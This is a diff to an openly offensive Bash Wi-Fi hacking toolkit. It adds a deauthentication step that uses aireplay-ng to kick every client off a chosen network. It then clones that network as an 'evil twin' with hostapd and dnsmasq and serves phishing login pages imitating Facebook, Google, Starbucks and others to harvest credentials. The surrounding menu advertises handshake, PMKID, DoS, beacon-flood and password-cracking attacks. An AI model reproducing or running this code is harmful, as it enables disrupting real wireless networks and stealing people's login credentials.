@@ -471,16 +471,14 @@ ntwkphishing() {
 	}
 
 	attack() {
-		tput cnorm; echo -ne "\n${blueColour}[?]$grayColour Name of the network to be used: " && read ssid
-		echo -ne "${blueColour}[?]$grayColour Channel to use (1-12): " && read ch
 		tput civis; clear; echo -e "\n${greenColour}[+]$grayColour Cleaning connections"
 		killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
 		sleep 3
 		echo -e "interface=${tar}\n" > hostapd.conf
 		echo -e "driver=nl80211\n" >> hostapd.conf
-		echo -e "ssid=$ssid\n" >> hostapd.conf
+		echo -e "ssid=$netclo\n" >> hostapd.conf
 		echo -e "hw_mode=g\n" >> hostapd.conf
-		echo -e "channel=$ch\n" >> hostapd.conf
+		echo -e "channel=$cloch\n" >> hostapd.conf
 		echo -e "macaddr_acl=0\n" >> hostapd.conf
 		echo -e "auth_algs=1\n" >> hostapd.conf
 		echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf
@@ -505,6 +503,10 @@ ntwkphishing() {
 		sleep 3
 		dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
 		cd src
+		if [ "$(echo $?)" -ne 0 ]; then
+			cd $pathmain
+			cd src
+		fi
 		logins=(facebook google starbucks twitter yahoo cliqq-payload optimumwifi)
 		tput cnorm
 		echo -ne "\n${redColour}[*]${grayColour} Login to be used (facebook, google, starbucks, twitter, yahoo, cliqq-payload, optimumwifi): " && read usedlogin
@@ -543,13 +545,29 @@ ntwkphishing() {
 				php -S 192.168.1.1:80 > /dev/null 2>&1 
 				popd > /dev/null 2>&1; credentials
 			fi
-		cd ..
+
+	  	cd $pathmain
 	}
-	
+	deau(){
+		xterm -hold -e "airodump-ng ${tar}" &
+		xtermnetclo=$!
+		tput cnorm; echo -ne "\n${purpleColour}[?]$grayColour What network do you want to clone?: " && read netclo
+		tput cnorm; echo -ne "\n${purpleColour}[?]$grayColour What channel is $netclo?: " && read cloch
+		tput civis
+		$cleancolor; kill -9 $xtermnetclo; wait $xtermnetclo 2>/dev/null
+		xterm -hold -e "airodump-ng -c $cloch --essid $netclo $tar" &
+		xtermAirclo=$!
+		sleep 2; xterm -hold -e "aireplay-ng -0 10000 -e $netclo -c FF:FF:FF:FF:FF:FF $tar" &
+		aireplay_xterm_PIDclo=$!
+		sleep 10; kill -9 $aireplay_xterm_PIDclo; wait $aireplay_xterm_PIDclo 2>/dev/null
+		kill -9 $xtermAirclo; wait $xtermAirclo 2>/dev/null
+		attack
+	}
+
 	clear
-	echo -e "\n$purpleColour[*]$grayColour Starting Wifiphisher..."
+	tput civis; echo -e "\n$purpleColour[*]$grayColour Starting Wifiphisher/Evil Twin..."
 	sleep 2
-	attack
+	deau
 }
 #[3] Denial of service attack with mdk
 dosattack() {
@@ -700,7 +718,7 @@ bannermainattack() {
 	bannerattack
 	echo -e "${turquoiseColour}\n[+]${grayColour} Hacking Wifi\t\t${turquoiseColour}[+]${grayColour} Fake Access Point\t\t${turquoiseColour}[+]${grayColour} Cracking password"
 	echo -e "${yellowColour}\n[1] Handshake Attack\t\t[7] Wifiphisher\t\t\t[9] Force Brute .cap"
-	echo -e "[2] PMKID Attack\t\t[8] Fake/Rogue AP\t\t[10] Hash .cap -> .hccapx"
+	echo -e "[2] PMKID Attack\t\t[8] Fake AP\t\t[10] Hash .cap -> .hccapx"
 	echo -e "[3] DoS Attack\t\t\t\t\t\t\t[11] Hashed Dictionary (Rainbow tables)"
 	echo -e "[4] Beacon Flood Attack\t\t\t\t\t\t[12] Force Brute with GPU"
 	echo -e "[5] Network traffic"
